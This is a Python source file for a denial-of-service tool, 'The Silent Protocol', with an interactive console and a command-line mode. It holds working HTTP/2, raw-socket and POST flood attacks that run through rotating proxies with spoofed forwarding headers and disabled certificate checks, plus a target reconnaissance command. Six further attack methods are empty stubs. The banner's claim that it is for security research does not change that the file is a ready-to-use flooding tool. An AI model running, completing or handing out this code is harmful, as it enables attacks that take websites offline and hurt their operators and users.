# -*- coding: utf-8 -*-
"""
The Silent Protocol - We are ghosts in the machine, but our impact is felt like a typhoon across the network.
"""
import os
import sys
import time
import random
import socket
import socks
import ssl
import threading
import datetime
import httpx
import cloudscraper
import requests
import urllib3
from urllib.parse import urlparse, quote
from colorama import Fore, Style, init
from fake_useragent import UserAgent
import dns.resolver
import ipaddress
import json
import re
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

init(autoreset=True)

CONFIG = {
    'max_threads': 5000,
    'connection_timeout': 10,
    'socket_buffer_size': 65536,
    'user_agents': './useragents/ua.txt',
    'proxies': './proxy.txt',
    'request_timeout': 15,
    'max_retries': 3,
    'rotate_proxies': True,
    'stealth_mode': True,
    'debug': False
}

class ProtocolEngine:
    """Core engine for managing attack protocols and resources."""
    
    def __init__(self):
        self.ua_generator = UserAgent()
        self.active_threads = []
        self.proxy_list = []
        self.user_agents = []
        self.target_cache = {}
        self.session = requests.Session()
        self.load_resources()
        self.attack_stats = {
            'total_requests': 0,
            'successful_requests': 0,
            'failed_requests': 0,
            'start_time': None,
            'current_method': None
        }
        
    def load_resources(self):
        """Load necessary resources like user agents and proxies."""
        try:
            if os.path.exists(CONFIG['user_agents']):
                with open(CONFIG['user_agents'], 'r', encoding='utf-8', errors='ignore') as f:
                    self.user_agents = [line.strip() for line in f if line.strip()]
            else:
                
                self.user_agents = [self.ua_generator.random for _ in range(500)]
                print(f"{Fore.YELLOW}[WARN] User agent file not found, generating {len(self.user_agents)} random agents")
                
            if os.path.exists(CONFIG['proxies']):
                with open(CONFIG['proxies'], 'r', encoding='utf-8', errors='ignore') as f:
                    self.proxy_list = [line.strip() for line in f if line.strip()]
                    print(f"{Fore.GREEN}[INFO] Loaded {len(self.proxy_list)} proxies")
            else:
                print(f"{Fore.YELLOW}[WARN] Proxy file not found, operating in direct mode")
                
        except Exception as e:
            print(f"{Fore.RED}[ERROR] Failed to load resources: {e}")

    def get_random_ua(self):
        """Return a random user agent."""
        return random.choice(self.user_agents) if self.user_agents else self.ua_generator.random

    def get_random_proxy(self):
        """Return a random proxy from the loaded list."""
        if not self.proxy_list:
            return None
        proxy = random.choice(self.proxy_list)
        if '://' not in proxy:
            proxy = f"http://{proxy}"
        return proxy

    def update_stats(self, success=True):
        """Update attack statistics."""
        self.attack_stats['total_requests'] += 1
        if success:
            self.attack_stats['successful_requests'] += 1
        else:
            self.attack_stats['failed_requests'] += 1

    def get_stats(self):
        """Get current attack statistics."""
        if self.attack_stats['start_time']:
            elapsed = datetime.datetime.now() - self.attack_stats['start_time']
            self.attack_stats['elapsed_time'] = str(elapsed)
            self.attack_stats['requests_per_second'] = self.attack_stats['total_requests'] / elapsed.total_seconds() if elapsed.total_seconds() > 0 else 0
        return self.attack_stats

class TargetResolver:
    """Handles target resolution and information gathering."""
    
    @staticmethod
    def resolve_target(url):
        """Comprehensive target resolution with additional intelligence."""
        url = url.rstrip()
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url  
            
        parsed = urlparse(url)
        target = {
            'original': url,
            'scheme': parsed.scheme,
            'host': parsed.netloc.split(':')[0],
            'port': parsed.port or (443 if parsed.scheme == 'https' else 80),
            'path': parsed.path or '/',
            'query': parsed.query,
            'fragment': parsed.fragment,
            'netloc': parsed.netloc,
            'url': url
        }
        
        target['ip'] = TargetResolver.resolve_dns(target['host'])
        target['asn'] = TargetResolver.get_asn_info(target['ip']) if target['ip'] else None
        target['geo'] = TargetResolver.get_geo_info(target['ip']) if target['ip'] else None
        target['security_headers'] = TargetResolver.analyze_security_headers(target)
        
        return target
    
    @staticmethod
    def resolve_dns(hostname):
        """Resolve hostname to IP address with fallback."""
        try:
            return socket.gethostbyname(hostname)
        except socket.gaierror:
            try:
                answers = dns.resolver.resolve(hostname, 'A')
                return str(answers[0]) if answers else None
            except:
                return None
    
    @staticmethod
    def get_asn_info(ip):
        """Get ASN information for an IP address."""
        try:
            response = requests.get(f"https://ipapi.co/{ip}/json/", timeout=5)
            if response.status_code == 200:
                data = response.json()
                return f"AS{data.get('asn', '???')} - {data.get('org', 'Unknown')}"
        except:
            pass
        return "AS??? - Unknown"
    
    @staticmethod
    def get_geo_info(ip):
        """Get geographical information for an IP address."""
        try:
            response = requests.get(f"https://ipapi.co/{ip}/json/", timeout=5)
            if response.status_code == 200:
                data = response.json()
                return f"{data.get('city', 'Unknown')}, {data.get('country_name', 'Unknown')}"
        except:
            pass
        return "Unknown Location"
    
    @staticmethod
    def analyze_security_headers(target):
        """Analyze security headers of the target."""
        try:
            response = requests.get(target['url'], timeout=10, verify=False)
            security_headers = [
                'Strict-Transport-Security',
                'Content-Security-Policy',
                'X-Content-Type-Options',
                'X-Frame-Options',
                'X-XSS-Protection',
                'Referrer-Policy',
                'Feature-Policy',
                'Permissions-Policy',
                'Server',
                'X-Powered-By'
            ]
            
            results = {}
            for header in security_headers:
                results[header] = response.headers.get(header, 'NOT SET')
            
            return results
        except Exception as e:
            return f"Analysis failed: {e}"

class StealthManager:
    """Manages stealth techniques and evasion methods."""
    
    @staticmethod
    def generate_spoofed_headers(target):
        """Generate sophisticated spoofed headers."""
        spoof_ip = StealthManager.generate_spoof_ip()
        referrers = [
            f"https://www.google.com/search?q={quote(target['host'])}",
            f"https://www.bing.com/search?q={quote(target['host'])}",
            f"https://twitter.com/",
            f"https://www.facebook.com/",
            f"https://www.reddit.com/",
            f"https://www.linkedin.com/",
            target['url']
        ]
        
        accept_languages = [
            "en-US,en;q=0.9",
            "fr-FR,fr;q=0.9,en;q=0.8",
            "de-DE,de;q=0.9,en;q=0.8",
            "es-ES,es;q=0.9,en;q=0.8",
            "ja-JP,ja;q=0.9,en;q=0.8",
            "ko-KR,ko;q=0.9,en;q=0.8",
            "zh-CN,zh;q=0.9,en;q=0.8"
        ]
        
        headers = {
            'User-Agent': UserAgent().random,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': random.choice(accept_languages),
            'Accept-Encoding': 'gzip, deflate, br',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Referer': random.choice(referrers),
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'TE': 'trailers',
            'X-Forwarded-For': spoof_ip,
            'X-Real-IP': spoof_ip,
            'X-Client-IP': spoof_ip,
            'X-Forwarded-Host': target['host'],
            'X-Forwarded-Proto': target['scheme'],
            'X-Originating-IP': spoof_ip,
            'X-Remote-IP': spoof_ip,
            'X-Remote-Addr': spoof_ip,
            'X-Cluster-Client-IP': spoof_ip,
            'Via': f'1.1 {spoof_ip}',
            'True-Client-IP': spoof_ip,
            'CF-Connecting-IP': spoof_ip
        }
        return headers
    
    @staticmethod
    def generate_spoof_ip():
        """Generate a believable spoofed IP address."""
        cloud_ranges = [
            (ipaddress.ip_network('3.0.0.0/9'), 1000),  
            (ipaddress.ip_network('34.0.0.0/8'), 500),   
            (ipaddress.ip_network('35.0.0.0/8'), 500),   
            (ipaddress.ip_network('104.0.0.0/8'), 300),  
            (ipaddress.ip_network('172.0.0.0/8'), 200)   
        ]
        
        networks, weights = zip(*cloud_ranges)
        chosen_network = random.choices(networks, weights=weights, k=1)[0]
        
        network_address = int(chosen_network.network_address)
        num_addresses = chosen_network.num_addresses
        
        random_ip = ipaddress.IPv4Address(network_address + random.randint(1, num_addresses - 2))
        return str(random_ip)
    
    @staticmethod
    def create_stealth_ssl_context():
        """Create SSL context with randomized parameters for fingerprint evasion."""
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        tls_versions = [
            ssl.PROTOCOL_TLS,
            ssl.PROTOCOL_TLSv1,
            ssl.PROTOCOL_TLSv1_1,
            ssl.PROTOCOL_TLSv1_2
        ]
        context.options |= ssl.OP_NO_SSLv2
        context.options |= ssl.OP_NO_SSLv3
        
        if random.choice([True, False]):
            context.options |= ssl.OP_NO_TLSv1
        if random.choice([True, False]):
            context.options |= ssl.OP_NO_TLSv1_1
            
        return context

class AttackOrchestrator:
    """Orchestrates various attack methods with enhanced capabilities."""
    
    def __init__(self, protocol_engine):
        self.engine = protocol_engine
        self.scraper = cloudscraper.create_scraper()
        self.http2_client = None
        self.active = False
        
    def initialize_http2(self):
        """Initialize HTTP/2 client with advanced configuration."""
        if not self.http2_client:
            self.http2_client = httpx.Client(
                http2=True,
                timeout=CONFIG['request_timeout'],
                limits=httpx.Limits(max_keepalive_connections=100, max_connections=1000),
                follow_redirects=True
            )
    
    def execute_attack(self, method, target, threads, duration, **kwargs):
        """Execute the specified attack method."""
        self.active = True
        target_info = TargetResolver.resolve_target(target)
        self.engine.attack_stats = {
            'total_requests': 0,
            'successful_requests': 0,
            'failed_requests': 0,
            'start_time': datetime.datetime.now(),
            'current_method': method,
            'target': target_info['host']
        }
        
        print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗")
        print(f"{Fore.CYAN}║                   {Fore.WHITE}ATTACK INITIATED                    {Fore.CYAN}║")
        print(f"{Fore.CYAN}╠══════════════════════════════════════════════════════════════╣")
        print(f"{Fore.CYAN}║ {Fore.WHITE}Target: {Fore.YELLOW}{target_info['host']} ({target_info['ip']})")
        print(f"{Fore.CYAN}║ {Fore.WHITE}Method: {Fore.YELLOW}{method.upper()}")
        print(f"{Fore.CYAN}║ {Fore.WHITE}Threads: {Fore.YELLOW}{threads} {Fore.WHITE}Duration: {Fore.YELLOW}{duration}s")
        if target_info['asn']:
            print(f"{Fore.CYAN}║ {Fore.WHITE}ASN: {Fore.YELLOW}{target_info['asn']}")
        if target_info['geo']:
            print(f"{Fore.CYAN}║ {Fore.WHITE}Location: {Fore.YELLOW}{target_info['geo']}")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════════════╝\n")
        
        method_map = {
            'tsunami': self.tsunami_flood,
            'hurricane': self.hurricane_flood,
            'phantom': self.phantom_flood,
            'avalanche': self.avalanche_flood,
            'blizzard': self.blizzard_flood,
            'lightning': self.lightning_flood,
            'cyclone': self.cyclone_flood,
            'inferno': self.inferno_flood
        }
        
        attack_func = method_map.get(method.lower())
        if not attack_func:
            print(f"{Fore.RED}[ERROR] Unknown attack method: {method}")
            return False
        
        try:
            stats_thread = threading.Thread(target=self.display_stats, daemon=True)
            stats_thread.start()
            
            countdown_thread = threading.Thread(target=self.countdown, args=(duration,))
            countdown_thread.start()
            
            attack_func(target_info, threads, duration, **kwargs)
            
            countdown_thread.join()
            self.active = False
            
            self.display_final_stats()
            
            return True
        except Exception as e:
            print(f"{Fore.RED}[ERROR] Attack execution failed: {e}")
            import traceback
            traceback.print_exc()
            return False
        finally:
            self.active = False
    
    def display_stats(self):
        """Display real-time statistics."""
        while self.active:
            stats = self.engine.get_stats()
            rps = stats.get('requests_per_second', 0)
            success_rate = (stats['successful_requests'] / stats['total_requests'] * 100) if stats['total_requests'] > 0 else 0
            
            sys.stdout.write(f"\r{Fore.CYAN}[STATS] {Fore.WHITE}Req: {stats['total_requests']} | "
                           f"OK: {stats['successful_requests']} | "
                           f"FAIL: {stats['failed_requests']} | "
                           f"RPS: {rps:.1f} | "
                           f"Success: {success_rate:.1f}%")
            sys.stdout.flush()
            time.sleep(1)
    
    def display_final_stats(self):
        """Display final statistics after attack completion."""
        stats = self.engine.get_stats()
        rps = stats.get('requests_per_second', 0)
        success_rate = (stats['successful_requests'] / stats['total_requests'] * 100) if stats['total_requests'] > 0 else 0
        
        print(f"\n\n{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗")
        print(f"{Fore.CYAN}║                   {Fore.WHITE}ATTACK COMPLETED                    {Fore.CYAN}║")
        print(f"{Fore.CYAN}╠══════════════════════════════════════════════════════════════╣")
        print(f"{Fore.CYAN}║ {Fore.WHITE}Total Requests: {Fore.YELLOW}{stats['total_requests']}")
        print(f"{Fore.CYAN}║ {Fore.WHITE}Successful: {Fore.GREEN}{stats['successful_requests']} {Fore.WHITE}Failed: {Fore.RED}{stats['failed_requests']}")
        print(f"{Fore.CYAN}║ {Fore.WHITE}Success Rate: {Fore.YELLOW}{success_rate:.1f}%")
        print(f"{Fore.CYAN}║ {Fore.WHITE}Requests/Second: {Fore.YELLOW}{rps:.1f}")
        print(f"{Fore.CYAN}║ {Fore.WHITE}Duration: {Fore.YELLOW}{stats.get('elapsed_time', 'N/A')}")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════════════╝")
    
    def countdown(self, duration):
        """Display attack countdown."""
        end_time = datetime.datetime.now() + datetime.timedelta(seconds=duration)
        while datetime.datetime.now() < end_time and self.active:
            remaining = (end_time - datetime.datetime.now()).total_seconds()
            sys.stdout.write(f"\r{Fore.MAGENTA}[TIME] {Fore.WHITE}Remaining: {remaining:.1f}s")
            sys.stdout.flush()
            time.sleep(0.1)
        print(f"\r{Fore.GREEN}[TIME] {Fore.WHITE}Completed" + " " * 30)
    
    def tsunami_flood(self, target, threads, duration):
        """Advanced high-volume HTTP flood with intelligent request patterns."""
        self.initialize_http2()
        end_time = time.time() + duration
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            for _ in range(threads * 2):  
                futures.append(executor.submit(self._tsunami_worker, target, end_time))
            
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    if CONFIG['debug']:
                        print(f"{Fore.RED}[DEBUG] Worker error: {e}")
    
    def _tsunami_worker(self, target, end_time):
        """Worker for tsunami flood attack."""
        while time.time() < end_time and self.active:
            try:
                headers = StealthManager.generate_spoofed_headers(target)
                proxy = self.engine.get_random_proxy()
                
                if proxy and CONFIG['rotate_proxies']:
                    response = self.http2_client.get(
                        target['url'],
                        headers=headers,
                        proxies={'http://': proxy, 'https://': proxy},
                        timeout=CONFIG['request_timeout']
                    )
                else:
                    response = self.http2_client.get(
                        target['url'],
                        headers=headers,
                        timeout=CONFIG['request_timeout']
                    )
                
                self.engine.update_stats(response.status_code < 400)
                
            except Exception as e:
                self.engine.update_stats(False)
                if CONFIG['debug']:
                    print(f"{Fore.RED}[DEBUG] Request failed: {e}")
    
    def hurricane_flood(self, target, threads, duration):
        """Multi-vector attack combining multiple techniques."""
        end_time = time.time() + duration
        methods = [self._http_flood, self._socket_flood, self._post_flood]
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            for _ in range(threads):
                method = random.choice(methods)
                futures.append(executor.submit(method, target, end_time))
            
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    if CONFIG['debug']:
                        print(f"{Fore.RED}[DEBUG] Worker error: {e}")
    
    def _http_flood(self, target, end_time):
        """HTTP flood worker."""
        session = requests.Session()
        while time.time() < end_time and self.active:
            try:
                headers = StealthManager.generate_spoofed_headers(target)
                response = session.get(
                    target['url'],
                    headers=headers,
                    timeout=CONFIG['request_timeout'],
                    verify=False
                )
                self.engine.update_stats(response.status_code < 400)
            except:
                self.engine.update_stats(False)
    
    def _socket_flood(self, target, end_time):
        """Socket flood worker."""
        while time.time() < end_time and self.active:
            try:
                if target['scheme'] == 'https':
                    context = StealthManager.create_stealth_ssl_context()
                    with socket.create_connection((target['host'], target['port']), 
                                                timeout=CONFIG['connection_timeout']) as sock:
                        with context.wrap_socket(sock, server_hostname=target['host']) as ssock:
                            self._send_socket_payload(ssock, target)
                else:
                    with socket.create_connection((target['host'], target['port']), 
                                                timeout=CONFIG['connection_timeout']) as sock:
                        self._send_socket_payload(sock, target)
                
                self.engine.update_stats(True)
            except:
                self.engine.update_stats(False)
    
    def _send_socket_payload(self, sock, target):
        """Send crafted socket payload."""
        payload = f"GET {target['path']} HTTP/1.1\r\n"
        payload += f"Host: {target['host']}\r\n"
        payload += "Connection: keep-alive\r\n"
        payload += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        payload += "User-Agent: {}\r\n".format(UserAgent().random)
        payload += "Accept-Language: en-US,en;q=0.5\r\n"
        payload += "Accept-Encoding: gzip, deflate\r\n"
        payload += "DNT: 1\r\n"
        payload += "Upgrade-Insecure-Requests: 1\r\n"
        payload += "\r\n"
        
        sock.sendall(payload.encode())
      
        time.sleep(0.1)
    
    def _post_flood(self, target, end_time):
        """POST request flood worker."""
        session = requests.Session()
        while time.time() < end_time and self.active:
            try:
                headers = StealthManager.generate_spoofed_headers(target)
      
                form_data = {
                    'username': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz1234567890', k=8)),
                    'password': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz1234567890', k=12)),
                    'csrf': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz1234567890', k=32))
                }
                
                response = session.post(
                    target['url'],
                    data=form_data,
                    headers=headers,
                    timeout=CONFIG['request_timeout'],
                    verify=False
                )
                self.engine.update_stats(response.status_code < 400)
            except:
                self.engine.update_stats(False)
    
    def phantom_flood(self, target, threads, duration):
        """Stealth attack with randomized patterns and delays."""
        pass
    
    def avalanche_flood(self, target, threads, duration):
        """Rapid successive request attack."""
        pass
    
    def blizzard_flood(self, target, threads, duration):
        """Multi-connection persistent attack."""
        pass
    
    def lightning_flood(self, target, threads, duration):
        """Ultra-fast single-packet attack."""
        pass
    
    def cyclone_flood(self, target, threads, duration):
        """Rotating attack vectors."""
        # Implementation would go here
        pass
    
    def inferno_flood(self, target, threads, duration):
        """Maximum intensity resource exhaustion attack."""
        pass

class AdvancedUI:
    """Sophisticated user interface with enhanced visualization."""
    
    @staticmethod
    def display_banner():
        """art banner."""
        banner = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════════════════════╗
{Fore.CYAN}║                                                                              ║
{Fore.CYAN}║    {Fore.BLUE}▓█████▄  ██▀███   ██▓ ██▓███   ██░ ██  █    ██  ██▓    ▄▄▄       {Fore.CYAN}║
{Fore.CYAN}║    {Fore.BLUE}▒██▀ ██▌▓██ ▒ ██▒▓██▒▓██░  ██▒▓██░ ██▒ ██  ▓██▒▓██▒   ▒████▄     {Fore.CYAN}║
{Fore.CYAN}║    {Fore.BLUE}░██   █▌▓██ ░▄█ ▒▒██▒▓██░ ██▓▒▒██▀▀██░▓██  ▒██░▒██░   ▒██  ▀█▄   {Fore.CYAN}║
{Fore.CYAN}║    {Fore.BLUE}░▓█▄   ▌▒██▀▀█▄  ░██░▒██▄█▓▒ ▒░▓█ ░██ ▓▓█  ░██░▒██░   ░██▄▄▄▄██  {Fore.CYAN}║
{Fore.CYAN}║    {Fore.BLUE}░▒████▓ ░██▓ ▒██▒░██░▒██▒ ░  ░░▓█▒░██▓▒▒█████▓ ░██████▒▓█   ▓██▒ {Fore.CYAN}║
{Fore.CYAN}║    {Fore.BLUE} ▒▒▓  ▒ ░ ▒▓ ░▒▓░░▓  ▒▓▒░ ░  ░ ▒ ░░▒░▒░▒▓▒ ▒ ▒ ░ ▒░▓  ░▒▒   ▓▒█░ {Fore.CYAN}║
{Fore.CYAN}║    {Fore.BLUE} ░ ▒  ▒   ░▒ ░ ▒░ ▒ ░░▒ ░      ▒ ░▒░ ░░░▒░ ░ ░ ░ ░ ▒  ░ ▒   ▒▒ ░ {Fore.CYAN}║
{Fore.CYAN}║    {Fore.BLUE} ░ ░  ░   ░░   ░  ▒ ░░░        ░  ░░ ░ ░░░ ░ ░   ░ ░    ░   ▒    {Fore.CYAN}║
{Fore.CYAN}║    {Fore.BLUE}   ░       ░      ░            ░  ░  ░   ░         ░  ░     ░  ░ {Fore.CYAN}║
{Fore.CYAN}║    {Fore.BLUE} ░                                                              {Fore.CYAN}║
{Fore.CYAN}║                                                                              ║
{Fore.CYAN}║    {Fore.WHITE}The Silent Protocol - Advanced Network Analysis Tool v2.0              {Fore.CYAN}║
{Fore.CYAN}║    {Fore.YELLOW}Designed for security research and penetration testing                {Fore.CYAN}║
{Fore.CYAN}╚══════════════════════════════════════════════════════════════════════════════╝
        """
        print(banner)
    
    @staticmethod
    def show_help():
        """Display enhanced help information."""
        help_text = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════════════════════╗
{Fore.CYAN}║                         {Fore.WHITE}COMMAND REFERENCE GUIDE                          {Fore.CYAN}║
{Fore.CYAN}╠══════════════════════════════════════════════════════════════════════════════╣
{Fore.CYAN}║  {Fore.MAGENTA}Core Attack Methods:                                               {Fore.CYAN}║
{Fore.CYAN}║  {Fore.WHITE}tsunami    {Fore.YELLOW}Advanced high-volume HTTP/2 flood with intelligent patterns   {Fore.CYAN}║
{Fore.CYAN}║  {Fore.WHITE}hurricane  {Fore.YELLOW}Multi-vector attack combining various techniques             {Fore.CYAN}║
{Fore.CYAN}║  {Fore.WHITE}phantom    {Fore.YELLOW}Stealth attack with randomized patterns and delays           {Fore.CYAN}║
{Fore.CYAN}║  {Fore.WHITE}avalanche  {Fore.YELLOW}Rapid successive request attack                              {Fore.CYAN}║
{Fore.CYAN}║  {Fore.WHITE}blizzard   {Fore.YELLOW}Multi-connection persistent attack                           {Fore.CYAN}║
{Fore.CYAN}║  {Fore.WHITE}lightning  {Fore.YELLOW}Ultra-fast single-packet attack                              {Fore.CYAN}║
{Fore.CYAN}║  {Fore.WHITE}cyclone    {Fore.YELLOW}Rotating attack vectors                                     {Fore.CYAN}║
{Fore.CYAN}║  {Fore.WHITE}inferno    {Fore.YELLOW}Maximum intensity resource exhaustion attack                {Fore.CYAN}║
{Fore.CYAN}╠══════════════════════════════════════════════════════════════════════════════╣
{Fore.CYAN}║  {Fore.MAGENTA}Utility Commands:                                                  {Fore.CYAN}║
{Fore.CYAN}║  {Fore.WHITE}scan       {Fore.YELLOW}Comprehensive target analysis and reconnaissance            {Fore.CYAN}║
{Fore.CYAN}║  {Fore.WHITE}stats      {Fore.YELLOW}Show current attack statistics                              {Fore.CYAN}║
{Fore.CYAN}║  {Fore.WHITE}stop       {Fore.YELLOW}Stop current attack                                        {Fore.CYAN}║
{Fore.CYAN}║  {Fore.WHITE}config     {Fore.YELLOW}Show or modify configuration                               {Fore.CYAN}║
{Fore.CYAN}║  {Fore.WHITE}help       {Fore.YELLOW}Show this help message                                     {Fore.CYAN}║
{Fore.CYAN}║  {Fore.WHITE}exit       {Fore.YELLOW}Exit the application                                       {Fore.CYAN}║
{Fore.CYAN}╚══════════════════════════════════════════════════════════════════════════════╝
        """
        print(help_text)
    
    @staticmethod
    def get_input(prompt):
        """Get user input with styled prompt."""
        return input(f"{Fore.CYAN}╔═══[{Fore.WHITE}root{Fore.CYAN}@{Fore.WHITE}SilentProtocol{Fore.CYAN}]\n╚══>{Fore.WHITE} {prompt}")

def main():
    """Main application entry point."""
    AdvancedUI.display_banner()
    
    engine = ProtocolEngine()
    orchestrator = AttackOrchestrator(engine)
    
    print(f"{Fore.GREEN}[INFO] Silent Protocol initialized successfully")
    print(f"{Fore.GREEN}[INFO] Loaded {len(engine.user_agents)} user agents")
    print(f"{Fore.GREEN}[INFO] Loaded {len(engine.proxy_list)} proxies\n")
    
    while True:
        try:
            command = AdvancedUI.get_input("").strip().lower()
            
            if command in ['exit', 'quit']:
                print(f"{Fore.YELLOW}[INFO] Shutting down...")
                break
                
            elif command == 'help':
                AdvancedUI.show_help()
                
            elif command == 'clear':
                os.system('cls' if os.name == 'nt' else 'clear')
                AdvancedUI.display_banner()
                
            elif command.startswith('scan'):
                parts = command.split()
                if len(parts) < 2:
                    print(f"{Fore.RED}[ERROR] Usage: scan <url>")
                else:
                    target = TargetResolver.resolve_target(parts[1])
                    print(f"{Fore.CYAN}[SCAN] Target: {target['host']}")
                    print(f"{Fore.CYAN}[SCAN] IP: {target['ip']}")
                    print(f"{Fore.CYAN}[SCAN] ASN: {target['asn']}")
                    print(f"{Fore.CYAN}[SCAN] Location: {target['geo']}")
                    print(f"{Fore.CYAN}[SCAN] Security Headers:")
                    for header, value in target['security_headers'].items():
                        print(f"  {header}: {value}")
                        
            elif command == 'stats':
                stats = engine.get_stats()
                if stats['current_method']:
                    print(f"{Fore.CYAN}[STATS] Current Attack: {stats['current_method']}")
                    print(f"{Fore.CYAN}[STATS] Target: {stats.get('target', 'N/A')}")
                    print(f"{Fore.CYAN}[STATS] Requests: {stats['total_requests']}")
                    print(f"{Fore.CYAN}[STATS] Successful: {stats['successful_requests']}")
                    print(f"{Fore.CYAN}[STATS] Failed: {stats['failed_requests']}")
                    if 'elapsed_time' in stats:
                        print(f"{Fore.CYAN}[STATS] Duration: {stats['elapsed_time']}")
                    if 'requests_per_second' in stats:
                        print(f"{Fore.CYAN}[STATS] RPS: {stats['requests_per_second']:.1f}")
                else:
                    print(f"{Fore.YELLOW}[INFO] No active attack")
                    
            elif command.startswith(('tsunami', 'hurricane', 'phantom', 'avalanche', 
                                   'blizzard', 'lightning', 'cyclone', 'inferno')):
                parts = command.split()
                if len(parts) < 4:
                    print(f"{Fore.RED}[ERROR] Usage: <method> <url> <threads> <duration>")
                else:
                    method, target, threads, duration = parts[0], parts[1], parts[2], parts[3]
                    try:
                        orchestrator.execute_attack(method, target, int(threads), int(duration))
                    except ValueError:
                        print(f"{Fore.RED}[ERROR] Threads and duration must be integers")
                    except Exception as e:
                        print(f"{Fore.RED}[ERROR] Attack failed: {e}")
                        
            elif command == 'stop':
                orchestrator.active = False
                print(f"{Fore.YELLOW}[INFO] Attack stopped")
                
            elif command == 'config':
                print(f"{Fore.CYAN}[CONFIG] Current configuration:")
                for key, value in CONFIG.items():
                    print(f"  {key}: {value}")
                    
            else:
                print(f"{Fore.RED}[ERROR] Unknown command. Type 'help' for available commands.")
                
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[INFO] Interrupted by user")
            orchestrator.active = False
            continue
        except Exception as e:
            print(f"{Fore.RED}[ERROR] Unexpected error: {e}")
            if CONFIG['debug']:
                import traceback
                traceback.print_exc()

if __name__ == '__main__':
    
    if len(sys.argv) >= 5:
       
        engine = ProtocolEngine()
        orchestrator = AttackOrchestrator(engine)
        
        method, target, threads, duration = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]
        try:
            success = orchestrator.execute_attack(method, target, int(threads), int(duration))
            sys.exit(0 if success else 1)
        except Exception as e:
            print(f"{Fore.RED}[ERROR] {e}")
            sys.exit(1)
    else:
        main()